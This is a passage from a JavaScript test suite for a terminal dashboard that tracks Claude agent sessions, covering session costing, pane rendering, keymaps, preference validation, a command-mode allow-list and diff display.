  // A pan that could not reach the end would be truncation dressed as a feature.
  assert.ok(further.includes('col390'),
    'the far END of the line is reachable by panning — nothing is out of reach');
});

test('sessionMeta costs each session from ITS OWN transcript, not the caller cwd', () => {
  // The session picker lists EVERY workspace's sessions. Costing them re-resolved the transcript from
  // the caller's cwd, and that lookup only walks UP — so from any directory that is not the session's
  // own workspace, tokens/duration/model/effort all came back empty and the picker printed blanks.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-meta-'));
  const cfg = path.join(dir, 'cfg');
  const ws = path.join(dir, 'a-workspace');           // where the session lives
  const elsewhere = path.join(dir, 'somewhere-else'); // where the reader is standing
  fs.mkdirSync(ws, { recursive: true });
  fs.mkdirSync(elsewhere, { recursive: true });
  // The product's OWN mangling rule, not a restatement of it. Hand-rolling `ws.replace(/[/\\.]/g,'-')`
  // passed on macOS and Linux and could not pass on Windows: it leaves the drive-letter colon in place,
  // and `C:-Users-…` is not a legal directory name there. A test that guesses at the rule it is
  // exercising tests the guess.
  const id = '11111111-2222-3333-4444-555555555555';
  const prev = process.env.CLAUDE_CONFIG_DIR;
  // Set INSIDE the try, or a throw in the fixture writes below leaks a config dir pointing at a
  // deleted temp directory into every test that runs after this one.
  try {
    process.env.CLAUDE_CONFIG_DIR = cfg; // projectDir resolves the config dir at call time
    const proj = core.projectDir(ws);
    fs.mkdirSync(proj, { recursive: true });
    fs.writeFileSync(path.join(proj, id + '.jsonl'),
      [JSON.stringify({ type: 'user', cwd: ws, timestamp: '2026-01-01T00:00:00.000Z', message: { role: 'user', content: 'name me' } }),
       JSON.stringify({ type: 'assistant', timestamp: '2026-01-01T00:10:00.000Z',
         message: { role: 'assistant', model: 'claude-opus-4-5-20251101', usage: { input_tokens: 700, output_tokens: 300, cache_creation_input_tokens: 0, cache_read_input_tokens: 9000000 } } })].join('\n') + '\n');
    const row = core.sessionMeta(elsewhere).sessions.find((r) => r.id === id);
    assert.ok(row, 'the session was not listed at all from a foreign cwd');
    // input+output only. cacheRead is 9M here precisely so a regression that folds it back in is loud.
    assert.equal(row.tokens, 1000, 'tokens must be costed from the transcript of that session');
    assert.equal(row.cached, 9000000, 'and cache traffic stays in its own column');
    assert.equal(row.durationMs, 600000, 'duration must come from that transcript too');
    assert.ok(/opus/i.test(row.model), 'model was ' + JSON.stringify(row.model));
    assert.ok(row.workspace.endsWith(path.basename(ws)), 'workspace label was ' + JSON.stringify(row.workspace));
  } finally {
    if (prev === undefined) delete process.env.CLAUDE_CONFIG_DIR; else process.env.CLAUDE_CONFIG_DIR = prev;
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test('tui: Fleet shows what an agent COST, and nests the agents it spawned', () => {
  // The terminal's Fleet showed phase, deltas, a sparkline and a branch — and stopped there, while the
  // editors showed tokens, runtime, model, effort and the subagent tree. Everything but model/effort
  // was already on the agent payload; the row simply did not read it.
  const agents = [{
    session: 'S1', gitBranch: 'feat/x', self: true, phase: 'working', sparkline: [1, 2, 3],
    diff: { added: 10, removed: 2 }, tokens: 3_695_326, durationMs: 82_722_836,
    subagents: [
      { agentId: 'g1', agentType: 'Explore', description: 'Map the release machinery', phase: 'done', added: 3, removed: 1 },
      { agentId: 'g2', agentType: 'Explore', phase: 'working' },
    ],
  }];
  const views = { multitask: { agents }, sessions: { sessions: [{ id: 'S1', model: 'opus-5', effort: 'high' }] } };
  const rows = tui.rowsFor(paneFixture({ screen: 'agents', views, panes: null }), 160);

  const parent = rows[0].cells;
  assert.match(parent, /3\.7M tok/, 'tokens, formatted the way the editors format them');
  assert.match(parent, /23\.0h/, 'and the runtime');
  // model and effort are per-SESSION, so this only appears if the agents→sessions join happens.
  assert.match(parent, /opus-5/, 'the model, joined from the sessions view');
  assert.match(parent, /high/, 'and the effort');

  // The subagents NEST rather than sitting in a flat list where the parent is unknowable.
  assert.equal(rows.length, 3, 'one agent row plus its two subagents');
  assert.match(rows[1].cells, /Explore/, 'a subagent names its type');
  assert.match(rows[1].cells, /Map the release machinery/, 'and what it was asked to do');
  assert.equal(rows[1].cont, true, 'children are continuation rows, so the cursor steps between AGENTS');
  assert.equal(rows[2].cont, true);
  // An unnamed subagent still says what it is, rather than showing its id.
  assert.doesNotMatch(rows[2].cells, /g2/, 'no bare agent id');

  // The formatters are core's, and must agree with what the editors' inline copies produce — the
  // webview script is a string and cannot import them, so the duplication is pinned here instead.
  const fmtTok = (n) => { n = n || 0; if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M'; if (n >= 1e3) return Math.round(n / 1e3) + 'k'; return '' + n; };
  const fmtDur = (ms) => { ms = ms || 0; const s = Math.round(ms / 1000); if (s < 60) return s + 's'; const m = Math.round(s / 60); if (m < 60) return m + 'm'; return (m / 60).toFixed(1) + 'h'; };
  for (const n of [0, 1, 999, 1000, 1500, 999_999, 1e6, 3_695_326]) {
    assert.equal(core.compactTokens(n), fmtTok(n), `compactTokens must match the editors at ${n}`);
  }
  // Garbage in must not reach a row. The session picker prints these beside a name someone is choosing
  // from, and a payload with no transcript carries '' and undefined rather than zeroes.
  for (const bad of [NaN, -5, undefined, null, Infinity]) {
    assert.equal(core.compactTokens(bad), '0', `compactTokens of ${String(bad)}`);
    assert.equal(core.compactDuration(bad), '0s', `compactDuration of ${String(bad)}`);
  }
  for (const m of [0, 999, 60_000, 3_599_000, 82_722_836]) {
    assert.equal(core.compactDuration(m), fmtDur(m), `compactDuration must match the editors at ${m}`);
  }
});

test('tui: an empty pane names its TAB, and says when a view never arrived', () => {
  // "nothing on Dashboards" is the same sentence whether Fleet, Tasks or Processes is the empty one —
  // and a reader looking at Fleet wants to know about Fleet. Worse, it was also the same sentence when
  // the view had not been REQUESTED at all: app.ts's allow-list decides which views a screen asks for,
  // and a screen missing from it renders an honest-looking nothing. That file's own comment calls that
  // out as the failure this product forbids; this is the pane holding up its end.
  const dash = (views, tab) => {
    const st = paneFixture({
      views, screen: 'edits',
      panes: { minimized: new Set(), zoom: null, focus: 'dashboards', tab: { dashboards: tab }, cursor: {}, scroll: {} },
    });
    const f = tui.renderDashFrame(st, { cols: 130, rows: 34, color: false });
    // The PANE HEADER, which carries the rule of dashes — not the window bar at row 0, which also says
    // "F6 …Dashboards" and would have this reading the Prompts pane's message instead.
    const at = f.findIndex((l) => /F6 Dashboards\s+-{5}/.test(l));
    assert.ok(at >= 0, `the Dashboards pane header is on screen: ${JSON.stringify(f.slice(0, 3))}`);
    return f.slice(at + 1).find((l) => /has no data|nothing on/.test(l))?.trim() ?? '';
  };

  // Tab 0 is Fleet, tab 2 is Tasks — the message must name the one being looked at.
  assert.match(dash({ changemap: {}, multitask: { agents: [] } }, 0), /nothing on Fleet yet/,
    'an empty Fleet says Fleet, not Dashboards');
  assert.match(dash({ changemap: {}, multitask: { tasks: [] } }, 2), /nothing on Tasks yet/,
    'and an empty Tasks says Tasks');

  // …and "the view never arrived" is a DIFFERENT answer from "there is nothing in it".
  const absent = dash({ changemap: {} }, 0);
  assert.match(absent, /multitask/, 'a missing view is named, so the reader has a lead rather than a shrug');
  assert.doesNotMatch(absent, /fills in as Claude works/, 'and is not dressed up as "nothing yet"');
});

test('tui: every dashboard names its rows, and never shows a bare id', () => {
  // The Tasks pane listed nineteen rows of `a3f21c9de4b7…` because it read `content`/`title` — the
  // spellings the plan harness used BEFORE tasks gained `subject`. The editors never had the bug:
  // VS Code reads `t.subject`, JetBrains reads it with a `task #N` fallback. This was the terminal
  // drifting away from them, and nothing noticed because falling back to an id is silent — the pane
  // still rendered, still filtered, still scrolled. It just stopped answering "what is this".
  const st = (screen, views) => paneFixture({ screen, views, panes: null });
  const cells = (screen, views) => tui.rowsFor(st(screen, views), 120).map((r) => r.cells);

  const tasks = [
    { id: '1', taskId: 'a3f21c9de4b7', subject: 'Ship the release', status: 'in_progress' },
    { id: '2', taskId: 'bb77aa11ccdd', content: 'an older session, still readable', status: 'completed' },
    { id: '3', taskId: 'cc88bb22ddee', status: 'pending' },
  ];
  const t = cells('tasks', { multitask: { tasks }, changemap: { rollupByTask: [] } });
  assert.match(t[0], /Ship the release/, '`subject` is what the harness emits today');
  assert.ok(!t[0].includes('a3f21c9de4b7'), 'and the digest does not appear beside it');
  assert.match(t[1], /an older session, still readable/, '`content` still works — an archived session must not turn into digests');
  // A task with NO name at all still says what it is. `task 3` beats `cc88bb22ddee` for a reader.
  assert.match(t[2], /task 3/, 'an unnamed row names its KIND rather than showing a raw id');
  assert.ok(!t[2].includes('cc88bb22ddee'), 'the digest is not the label');

  const w = cells('workflows', {
    multitask: { workflows: [{ id: '0f1e2d3c4b5a' }, { id: 'x', name: 'find-flaky-tests' }] },
    changemap: { rollupByWorkflow: [] },
  });
  assert.match(w[0], /workflow 0f1e2d3c/, 'an unnamed workflow is named as one, with a trimmed id');
  assert.match(w[1], /find-flaky-tests/, 'and a named one shows its name');

  // Agents already read a branch or a worktree; the point here is the LAST resort, which used to be a
  // bare session UUID.
  const a = cells('agents', { multitask: { agents: [{ session: 'deadbeefcafe1234', diff: {} }] } });
  assert.match(a[0], /session deadbeef/, 'an agent with no branch or worktree is still named as a session');
});

test('release: the version stamper knows about every workspace', () => {
  // `packages/tui` was a declared workspace that `scripts/version.mjs` had never heard of — absent
  // from its package list, from the core-pin list and from the lockfile keys. Nothing caught it:
  // `version:check` only compares the files it already knows, so it reported "all versions
  // consistent" while tui sat at a different version with a pin to a core build that no longer
  // existed. The failure surfaces two steps later, in CI, as `npm ci` resolving that pin from the
  // registry — where `@claude-observatory/core` has never been published — and 404ing.
  //
  // Asserted over the WORKSPACE LIST rather than by naming tui, because the next package added will
  // have exactly the same problem and nobody will remember this.
  const fs = require('fs');
  const path = require('path');
  const root = path.resolve(__dirname, '../../..');
  const workspaces = JSON.parse(fs.readFileSync(path.join(root, 'package.json'), 'utf8')).workspaces;
  const stamper = fs.readFileSync(path.join(root, 'scripts/version.mjs'), 'utf8');
  assert.ok(workspaces.length >= 3, `the workspace list must be real, got ${JSON.stringify(workspaces)}`);

  // Each list is sliced out and searched SEPARATELY. Searching the whole file passes as soon as the
  // path appears anywhere in it — so dropping a workspace from PKGS while it is still in
  // CORE_PIN_FILES read as covered, which is precisely the half-configured state this is for.
  const listBetween = (from, to) => stamper.slice(stamper.indexOf(from), stamper.indexOf(to));
  const pkgList = listBetween('const PKGS = [', 'const GRADLE');
  const keyList = listBetween('const WORKSPACE_KEYS = [', 'const read =');
  assert.ok(pkgList.includes('package.json') && keyList.includes('packages/'), 'the slices found real lists');

  for (const ws of workspaces) {
    assert.ok(pkgList.includes(`'${ws}/package.json'`),
      `${ws} is a workspace but scripts/version.mjs never stamps its version`);
    assert.ok(keyList.includes(`'${ws}'`),
      `${ws} is a workspace but is not among the stamper's lockfile keys`);
  }

  // …and any workspace that PINS core has to be in the pin list, or the pin outlives the version it
  // points at. Read from the manifests rather than assumed, so a package that starts depending on
  // core later is covered without anyone editing this test.
  const pinList = stamper.slice(stamper.indexOf('const CORE_PIN_FILES'), stamper.indexOf('const corePinRe'));
  for (const ws of workspaces) {
    const manifest = JSON.parse(fs.readFileSync(path.join(root, ws, 'package.json'), 'utf8'));
    const pins = { ...manifest.dependencies, ...manifest.devDependencies }['@claude-observatory/core'];
    if (!pins) continue;
    assert.ok(pinList.includes(`'${ws}/package.json'`),
      `${ws} pins @claude-observatory/core, so version.mjs must lockstep that pin`);
  }
});

test('keymap: every verb has a DOOR, and no two differ only by case', () => {
  // The existing scrape above runs one direction — advertised ⊆ bound — which is why `sort` and `wrap`
  // could ship bound to keys that no surface in the product named. `S` cycled the sort and `w` swapped
  // wrapping, and neither appeared in the key row, in the help screen, or (for sort, the only persisted
  // preference without one) in the options window. The only way to find either was to press it.
  //
  // This is the other direction: bound ⊆ documented.
  //
  // The KEYS section of the options window is deliberately NOT a door. It lists every REBINDABLE action
  // by construction, so counting it would make this assertion pass for anything — it tells a reader who
  // already knows a verb exists how to move it, not that it exists.
  const helpText = tui.helpLines({}).join('\n');
  const hintText = tui.KEY_HINTS.join('\n');
  const undocumented = core.REBINDABLE.filter((r) => {
    // Named either by its key (the hard-coded literals, e.g. `m  minimize or restore`) or by the label
    // of a boundRows entry, which renders the reader's own key followed by the description.
    const byKey = new RegExp(`(^|[\\s(/])${r.fallback.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}([\\s)/]|$)`, 'm');
    return !byKey.test(helpText) && !byKey.test(hintText);
  });
  assert.deepEqual(undocumented.map((r) => r.action), [],
    'every rebindable verb must be named in the key row or the keys screen — the options window’s KEYS list does not count');

  // …and no two verbs may differ only by CASE. `a`/`A` and `u`/`U` are the exception and stay: those
  // teach one rule — lowercase acts on the selection, uppercase on everything the window lists — which
  // is learnable. `r`/`R` (refresh / redo) and `s`/`S` (session / sort) taught nothing; they were two
  // unrelated verbs a shift key apart, which is the mistake the `o`-not-`M` note in prefs.ts already
  // called out and which the table beneath it then repeated four times.
  const PAIRS = new Set(['keep|keepAll', 'undo|undoAll']);
  const byLower = new Map();
  for (const r of core.REBINDABLE) {
    const k = r.fallback.toLowerCase();
    byLower.set(k, [...(byLower.get(k) ?? []), r]);
  }
  for (const [k, group] of byLower) {
    if (group.length < 2) continue;
    const name = group.map((r) => r.action).sort().join('|');
    assert.ok(PAIRS.has(name),
      `${group.map((r) => `${r.fallback} ${r.action}`).join(' and ')} differ only by case on “${k}” — one letter, two unrelated verbs`);
  }
});

test('options: every preference that PERSISTS has a row to change it', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-rows-'));
  const file = path.join(dir, 'prefs.json');

  // The persisted set is taken from `writePrefs` itself rather than from a hand-kept list here — a
  // list in the test is a list that goes stale in exactly the case this is for, which is somebody
  // adding a preference and no surface to change it. `sort` was that case: it had a Prefs field, a
  // reader in readPrefs, a writer in writePrefs and a key that cycled it, and it was the only
  // persisted preference the options window did not show.
  core.writePrefs({
    editor: 'code -w', color: 'never', glyphs: 'ascii', mouse: false, refreshSeconds: 9,
    startFocus: 'detail', startFace: 'diff', sort: 'churn', storeDir: '/tmp/obs-store',
    keys: { keep: 'K' }, remotes: [{ name: 'box', host: 'h', enabled: true }],
  }, file);
  const persisted = Object.keys(JSON.parse(fs.readFileSync(file, 'utf8')));
  assert.ok(persisted.length >= 10, `the fixture must actually persist something, got ${JSON.stringify(persisted)}`);

  // `store` is passed because that row is shown only when the caller knows the resolved root.
  const rows = tui.optionRows({}, { store: '/tmp/obs-store', file });
  const missing = persisted.filter((k) => !rows.some((r) =>
    r.id === k || r.id.startsWith(`${k}:`) || r.id.startsWith(`${k.replace(/s$/, '')}:`)));
  assert.deepEqual(missing, [],
    'a preference that survives a restart must be changeable from the options window, not only from an undocumented key');

  fs.rmSync(dir, { recursive: true, force: true });
});

test('command mode is an allow-list on VERBS and on ARGUMENTS', () => {
  // `:` is a text field that spawns a process, inside an app whose other keys revert files. Three of
  // its entries used to splat the rest of the line into the CLI, so `:store --move /tmp/x` moved every
  // session's edits, snapshots and caches and rewrote prefs — no confirmation, from a prompt whose own
  // documentation called it "an allow-list of read-only verbs".
  for (const [name, cmd] of Object.entries(tui.COMMANDS)) {
    assert.equal(cmd.args.length, 0, `:${name} must take no parameters — an arguments channel is how this becomes a shell`);
    assert.deepEqual(cmd.args(), [name === '?' ? 'help' : name], `:${name} runs exactly its own bare verb`);
    assert.ok(cmd.what, `:${name} says what it is for`);
  }
  // The one word anyone types into a prompt first, and the key the frame advertises for help elsewhere.
  assert.ok(tui.COMMANDS.help, '`:help` exists');
  assert.ok(tui.COMMANDS['?'], 'and `:?` is the same thing, because that is the help key everywhere else');
  // Prototype keys are not commands. A bare `COMMANDS[name]` found these and threw out of the handler.
  for (const evil of ['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__']) {
    assert.ok(!Object.hasOwn(tui.COMMANDS, evil), `:${evil} must not resolve to a command`);
  }
});

test('prefs: a hand-edited file degrades to defaults rather than breaking the dashboard', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'obs-prefs-'));
  const file = path.join(dir, 'prefs.json');

  assert.deepEqual(core.readPrefs(file), {}, 'an absent file is "no preferences", not an error');
  fs.writeFileSync(file, '{ this is not json');
  assert.deepEqual(core.readPrefs(file), {}, 'and neither is a truncated one — this runs on the first paint');

  // Every field is validated. A settings file can be older than the build reading it, newer, or typed
  // by hand, so an unusable value must read as "unset" rather than reach the renderer.
  fs.writeFileSync(file, JSON.stringify({
    editor: '  code -w  ',
    color: 'chartreuse',        // not a colour this build knows
    glyphs: 'block',
    mouse: 'yes',               // not a boolean
    refreshSeconds: 0,          // would spin: each refresh spawns a child process
    keys: { keep: 'K', undo: 'toolong', nosuchaction: 'x' },
  }));
  const p = core.readPrefs(file);
  assert.equal(p.editor, 'code -w', 'trimmed, and arguments survive');
  assert.equal(p.color, undefined, 'an unknown colour is dropped, not passed through');
  assert.equal(p.glyphs, 'block');
  assert.equal(p.mouse, undefined, 'a non-boolean is dropped');
  assert.equal(p.refreshSeconds, 1, 'and a zero interval is floored, never honoured');
  assert.deepEqual(p.keys, { keep: 'K' }, 'a multi-character bind and an unknown action are both dropped');

  // Writing keeps only what DIFFERS from the default: a file full of today's defaults would freeze
  // them into every future version, and the reader never asked for that.
  core.writePrefs({ color: 'auto', glyphs: 'ascii', mouse: true, refreshSeconds: 3, keys: { keep: 'a', undo: 'Z' } }, file);
  assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), { glyphs: 'ascii', keys: { undo: 'Z' } });

  // A rebind onto a key another action already owns is REPORTED, not silently swallowed.
  const clash = { keys: { keep: 'u' } };
  const conflicts = core.keyConflicts(clash);
  assert.equal(conflicts.length, 1, `one conflict, got ${JSON.stringify(conflicts)}`);
  assert.equal(conflicts[0].action, 'undo', 'and it names the action that LOSES its key');
  assert.equal(core.keymap(clash).get('u'), 'keep', 'the rebind wins the key');
  assert.deepEqual(core.keyConflicts({}), [], 'and the defaults collide with nothing');

  fs.rmSync(dir, { recursive: true, force: true });
});

test('options: every row is reachable, changeable, and says what it costs', () => {
  const rows = tui.optionRows({});
  const sel = tui.selectableRows(rows);
  assert.ok(sel.length >= core.REBINDABLE.length + 5, 'editor, display, every key, and the reset');
  for (const i of sel) assert.notEqual(rows[i].kind, 'heading', 'the cursor never lands on a heading');
  for (const r of rows) {
    if (r.kind === 'heading') continue;
    assert.ok(r.id, `${r.label} has a stable id to dispatch on`);
    assert.ok(r.help || r.kind === 'action', `${r.label} says what it does`);
  }

  // Choices CYCLE, in both directions, and come back to where they started.
  let p = {};
  const colourRow = rows.find((r) => r.id === 'color');
  const seen = [];
  for (let i = 0; i < 5; i++) { seen.push(tui.optionRows(p).find((r) => r.id === 'color').value); p = tui.applyOption(p, 'color', 1); }
  assert.deepEqual(seen, ['auto', 'truecolor', '256', '16', 'none'], 'forward through every colour');
  assert.equal(tui.optionRows(p).find((r) => r.id === 'color').value, 'auto', 'and back round to the start');
  assert.equal(tui.optionRows(tui.applyOption({}, 'color', -1)).find((r) => r.id === 'color').value, 'none', 'backwards wraps too');
  assert.equal(colourRow.kind, 'choice');

  // The refresh interval cannot be stepped to a value that would spin the CPU.
  let fast = { refreshSeconds: 1 };
  for (let i = 0; i < 5; i++) fast = tui.applyOption(fast, 'refreshSeconds', -1);
  assert.equal(fast.refreshSeconds, 1, 'stepping down stops at one second');

  // A captured key is applied; rebinding back to the default REMOVES the override rather than
  // persisting a value identical to it.
  const bound = tui.setOption({}, 'key:keep', 'K');
  assert.equal(bound.keys.keep, 'K');
  assert.equal(tui.setOption(bound, 'key:keep', 'a').keys, undefined, 'back to the default clears the entry');
  assert.deepEqual(tui.setOption({}, 'key:keep', 'nope'), {}, 'a non-single-key capture changes nothing');

  // A conflict reaches the ROW, so the reader sees it where they made it.
  const clashRow = tui.optionRows({ keys: { keep: 'u' } }).find((r) => r.id === 'key:undo');
  assert.match(clashRow.problem, /also bound to keep/);

  // And the window renders within its budget at every width, like every other surface here.
  for (const cols of [40, 60, 80, 120, 200]) {
    const out = tui.renderOptions(rows, sel[1], cols, 0, 12, tui.glyphs('ascii'), 'none');
    assert.equal(out.length, 12, `${cols}: exactly the height asked for`);
    for (const l of out) assert.ok(tui.displayWidth(l) <= cols, `${cols}: "${l}" is over budget`);
  }
});

test('panes: an overlay is a layer over the windows, not a different product', () => {
  // The top row used to repaint as the retired eight-screen nav the moment an overlay opened, so
  // pressing `s` or `?` told the reader their windows had vanished.
  const st = paneFixture({ overlay: { title: 'switch session', lines: [' a', ' b'], scroll: 0, cursor: 0 } });
  const f = tui.renderDashFrame(st, { cols: 120, rows: 20, color: false });
  assert.match(f[0], /F3 .?Traces/, 'the window bar survives an overlay');
  assert.doesNotMatch(f[0], /\b[5-8]\s+(Feed|Audit|Map)\b/, 'and the retired screen nav does not come back');
  assert.doesNotMatch(f[f.length - 1], /1-8 screens|j\/k/, 'nor does its key row');
});

test('panes: a zoomed Detail wraps a diff line rather than losing its tail', () => {
  // This used to be the separate full-screen overlay, which re-printed the `diff` verb's piped text.
  // Opening an edit zooms Detail now, so the wrap it has to survive is the rich diff's own.
  const long = 'const veryLongIdentifier = someOtherIdentifier.withAProperty(andAnArgument, andAnother);';
  const st = paneFixture({
    panes: { minimized: new Set(), zoom: 'detail', focus: 'detail', tab: {}, cursor: {}, scroll: {} },
    diffPatch: `@@ -1,1 +1,2 @@\n ctx\n+${long}\n`,
    diffMeta: { id: 7, path: '/w/x.ts', added: 1, removed: 0, verb: 'Edit' },
  });
  const cols = 60;
  const f = tui.renderDashFrame(st, { cols, rows: 16, color: false });
  const joined = f.join('').replace(/\s+/g, '');
  assert.ok(joined.includes('andAnother'), `the tail must survive; got ${JSON.stringify(f.slice(5, 12))}`);
  for (const l of f) assert.ok(tui.displayWidth(l) <= cols, 'and every line still fits the budget');
});

test('panes: the zoomed edit is COLOURED — bands, and markers when colour is gone', () => {
  // The full-screen reader this replaces showed the `diff` verb's piped output, which carries no
  // escapes at all: full screen was the one place a diff lost its add/remove shape.
  const st = paneFixture({
    panes: { minimized: new Set(), zoom: 'detail', focus: 'detail', tab: {}, cursor: {}, scroll: {} },
    diffPatch: '@@ -1,2 +1,2 @@\n ctx\n-was here\n+now here\n',
    diffMeta: { id: 7, path: '/w/x.ts', added: 1, removed: 1, verb: 'Edit' },
  });
  const lit = tui.renderDashFrame(st, { cols: 100, rows: 16, color: 'truecolor' });
  assert.ok(lit.some((l) => /\x1b\[48;2;18;46;24m/.test(l)), 'an added line carries the full-width green band');
  assert.ok(lit.some((l) => /\x1b\[48;2;58;22;22m/.test(l)), 'and a removed line the red one');
  // Positive control: the same state with colour off must NOT match, or the assertion above is free.
  const plain = tui.renderDashFrame(st, { cols: 100, rows: 16, color: false });
  assert.ok(!plain.some((l) => /\x1b\[48;2;/.test(l)), 'colour off means no bands at all');
  assert.ok(plain.some((l) => /^\s*\d*\s*\+now here/.test(l)), 'and the +/- markers carry the meaning instead');
  // The headline uses the tool the agent really ran, not one hard-coded verb.
  assert.ok(plain.some((l) => l.includes('● Edit(/w/x.ts)')), `headline names the verb and the whole path: ${JSON.stringify(plain.slice(3, 6))}`);
});

test('panes: Detail scrolls its diff, and stops at the last full screen', () => {
  // `paneRowCount` resolved Detail through the tab table while the renderer resolved it from the
  // selection, and returned a field nothing ever assigned — so it reported 0 rows for a face that was
  // drawing correctly, and the runtime pinned scroll at the top forever.
  const body = Array.from({ length: 80 }, (_, i) => `+line ${i}`).join('\n');
  const st = paneFixture({
    panes: { minimized: new Set(), zoom: 'detail', focus: 'detail', tab: {}, cursor: {}, scroll: {} },
    diffPatch: `@@ -0,0 +1,80 @@\n${body}\n`,
    diffMeta: { id: 9, path: '/w/x.ts', added: 80, removed: 0, verb: 'Write' },
  });
  const lay = tui.resolveLayout({ cols: 100, rows: 30, minimized: new Set(), zoom: 'detail', focus: 'detail', tab: {} });
  const box = lay.boxes.find((b) => b.id === 'detail');
  const n = tui.paneRowCount(st, box);
  assert.ok(n > box.body.h, `the diff is longer than the pane (${n} lines vs ${box.body.h} rows)`);
  assert.equal(n, tui.renderRichDiff(st.diffPatch, {
    cols: box.rect.w - 1, color: 'none', verb: 'Write', path: '/w/x.ts', added: 80, removed: 0,
  }).length, 'and the count IS the rendered line count');

  const at = (k) => {
    const s = { ...st, panes: { ...st.panes, scroll: { detail: k } } };
    return tui.paneVisible(s, box, undefined, 'none').map((v) => v.text);
  };
  assert.notDeepEqual(at(0), at(5), 'scrolling moves the window');
  assert.ok(at(5)[0].includes('line 2'), `scroll 5 starts five lines in, got ${JSON.stringify(at(5)[0])}`);
  // Diff lines are tagged -1: a diff is read, not picked from, so no cursor band lands on one.
  assert.deepEqual([...new Set(tui.paneVisible(st, box, undefined, 'none').map((v) => v.row))], [-1]);

  // The count must not depend on colour — the memo shares one entry between the renderer and the
  // counter on that promise, and would silently halve the cache if it were false.
  tui.paneVisible(st, box, undefined, 'truecolor');
  assert.equal(tui.paneRowCount(st, box), n, 'the line count is the same at every depth');
});

// ---------------------------------------------------------------------------
// The rich diff — the edit rendered the way the agent's own tools render it.
// ---------------------------------------------------------------------------

const PATCH = require('diff').createPatch(
  'x.ts',
  'function keys(cols) {\n  return cols >= 96\n    ? LONG\n    : SHORT;\n}\n',
  'function keys(cols) {\n  // pick by measurement\n  const budget = cols - 1;\n  return CANDIDATES.find((s) => w(s) <= budget) ?? "?";\n}\n'
);

test('richdiff: a styling pass never re-styles the escapes it just wrote', () => {
  // Tinting keywords and then numbers in two `.replace` passes let the number regex match the digits
  // INSIDE `\x1b[38;2;150;130;220m` — 38, 2, 150, 130, 220 are all number literals — and the line
  // came out as shredded escapes. Any pass over already-styled text must consume each char once.
  for (const depth of ['truecolor', '256']) {
    const out = tui.renderRichDiff(PATCH, { cols: 88, color: depth, path: 'x.ts', added: 3, removed: 3 });
    for (const line of out) {
      assert.doesNotMatch(line, /\x1b(?!\[[0-9;]*m)/, `${depth}: every ESC must open a well-formed CSI: ${JSON.stringify(line)}`);
      // A colour code must never contain a nested escape — the signature of the original defect.
      assert.doesNotMatch(line, /\x1b\[[0-9;]*\x1b/, `${depth}: nested escape inside a colour code`);
    }
  }
  // Positive control: the naive two-pass version really does corrupt, so this test can fail.
  const naive = 'return 96'.replace(/\breturn\b/, '\x1b[38;2;150;130;220mreturn\x1b[39m').replace(/\b\d+\b/g, (n) => `<${n}>`);
  assert.match(naive, /<150>/, 'the two-pass approach mangles its own escape codes');
});

test('richdiff: the band runs the full width, and the marker survives losing colour', () => {
  const cols = 70;
  const colored = tui.renderRichDiff(PATCH, { cols, color: 'truecolor', path: 'x.ts', added: 3, removed: 3 });
  for (const l of colored) assert.ok(tui.displayWidth(l) <= cols, 'within budget');
  const banded = colored.filter((l) => /\x1b\[48;2;/.test(l));
  assert.ok(banded.length >= 2, 'added and removed lines carry a background band');
  for (const l of banded) {
    assert.equal(tui.displayWidth(l), cols, 'the band reaches the right edge — a ragged margin reads as noise');
  }
  // Monochrome loses the shape and keeps the meaning: the +/- marker is always there.
  const plain = tui.renderRichDiff(PATCH, { cols, color: 'none', path: 'x.ts', added: 3, removed: 3 });
  assert.ok(plain.every((l) => !/\x1b/.test(l)), 'no escapes at depth none');
  assert.ok(plain.some((l) => /^\s*\d*\s\+/.test(l)), 'additions still marked with +');
  assert.ok(plain.some((l) => /^\s*\s-/.test(l)), 'removals still marked with -');
});

test('richdiff: line numbers track the file AFTER the edit, and content never gets cut', () => {
  const rows = tui.parsePatch(PATCH);
  const adds = rows.filter((r) => r.kind === 'add');
  assert.ok(adds.length >= 3, 'the fixture really adds lines');
  assert.ok(adds.every((r) => typeof r.n === 'number'), 'added lines carry a post-edit line number');
  assert.ok(rows.filter((r) => r.kind === 'del').every((r) => r.n === null), 'removed lines have none — they are not in the new file');

  // A line wider than the pane wraps onto a continuation rather than losing its tail.
  const wide = require('diff').createPatch('x.ts', 'a\n', 'const someVeryLongIdentifierName = anotherLongCallExpression(withArguments, andMore, andYetMore);\n');
  const out = tui.renderRichDiff(wide, { cols: 40, color: 'none', path: 'x.ts' });
  const joined = out.join('').replace(/\s+/g, '');
  assert.ok(joined.includes('andYetMore'), `the tail must survive wrapping; got ${JSON.stringify(out)}`);
});

test('layout: a dragged seam resizes, and can never starve a pane below its minimum', () => {
  // Draggable borders are load-bearing: without them the docked model is not worth its cost and the
  // design should be separate windows instead. So the drag has to be safe at EVERY width a pointer
  // can reach, not just the sensible ones — a reader can drag to column 1 and will.
  const base = tui.resolveLayout({ cols: 140, rows: 40, minimized: new Set(), focus: 'traces' });
  const wide = tui.resolveLayout({ cols: 140, rows: 40, minimized: new Set(), focus: 'traces', sizes: { traces: 70 } });
  const w = (l) => l.boxes.find((b) => b.id === 'traces').rect.w;
  assert.ok(w(wide) > w(base), 'a reader-set width actually widens the pane');

  const mins = Object.fromEntries(tui.PANE_SPECS.map((p) => [p.id, p.min]));
  const bad = [];
  for (let want = 1; want <= 200; want++) {
    const l = tui.resolveLayout({ cols: 120, rows: 36, minimized: new Set(), focus: 'traces', sizes: { traces: want } });
    for (const b of l.boxes) {
      if (b.id !== 'dashboards' && b.rect.w < mins[b.id]) bad.push({ want, pane: b.id, w: b.rect.w, min: mins[b.id] });
    }
    const band = l.boxes.filter((b) => b.id !== 'dashboards' && b.id !== 'prompts').sort((a, b) => a.rect.x - b.rect.x);
    const last = band[band.length - 1];
    if (last && last.rect.x + last.rect.w !== 120) bad.push({ want, err: 'band stopped tiling' });
  }
  assert.deepEqual(bad, [], `drag produced an illegal layout: ${JSON.stringify(bad.slice(0, 3))}`);
});

